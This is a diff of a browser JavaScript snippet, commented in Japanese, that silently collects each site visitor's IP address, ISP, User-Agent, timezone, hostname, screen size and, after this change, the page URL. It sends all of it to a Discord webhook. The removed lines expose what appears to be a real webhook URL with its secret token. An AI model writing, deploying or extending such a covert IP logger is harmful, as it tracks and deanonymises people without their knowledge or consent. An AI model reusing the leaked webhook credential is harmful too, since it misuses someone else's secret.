@@ -1,5 +1,3 @@
-
-
 // アクセスした人のUser-Agentを取得する
 const userAgent = window.navigator.userAgent;
 
@@ -21,8 +19,11 @@ fetch('https://api.ipify.org?format=json')
       .then(data => {
         const isp = data.org;
 
+        // アクセスしたサイトのURLを取得する
+        const url = window.location.href;
+
         // DiscordのWebhook URL
-        const webhookUrl = 'https://discord.com/api/webhooks/1096359611025596466/62Mx7UMX2KpAFFonceWoMoSrL4m0Ie0zuxQ6xRy1cbLZcTwGZxYC9iG7ZFXYzQQItD9A';
+        const webhookUrl = 'https://discord.com/api/webhooks/your-webhook-url-here';
 
         // アクセスした人のデバイス情報をまとめる
         const deviceInfo = {
@@ -32,6 +33,7 @@ fetch('https://api.ipify.org?format=json')
           'Hostname': hostName,
           'ISP': isp,
           'Device': `${window.screen.width}x${window.screen.height}`,
+          'URL': url,
         };
 
         // DiscordのWebhookにデータを送信する
@@ -43,33 +45,17 @@ fetch('https://api.ipify.org?format=json')
           body: JSON.stringify({
             embeds: [{
               title: 'アクセス情報',
-              color: 16711680,
+              color: 0x00ff00,
               fields: [
-                {
-                  name: 'User-Agent',
-                  value: deviceInfo['User-Agent'],
-                },
-                {
-                  name: 'IP',
-                  value: deviceInfo['IP'],
-                },
-                {
-                  name: 'Timezone',
-                  value: deviceInfo['Timezone'],
-                },
-                {
-                  name: 'Hostname',
-                  value: deviceInfo['Hostname'],
-                },
-                {
-                  name: 'ISP',
-                  value: deviceInfo['ISP'],
-                },
-                {
-                  name: 'Device',
-                  value: deviceInfo['Device'],
-                },
+                { name: 'User-Agent', value: userAgent, inline: false },
+                { name: 'IP', value: ip, inline: true },
+                { name: 'Timezone', value: timeZone, inline: true },
+                { name: 'Hostname', value: hostName, inline: false },
+                { name: 'ISP', value: isp, inline: false },
+                { name: 'Device', value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                { name: 'URL', value: url, inline: false },
               ],
+              timestamp: new Date(),
             }],
           }),
         });
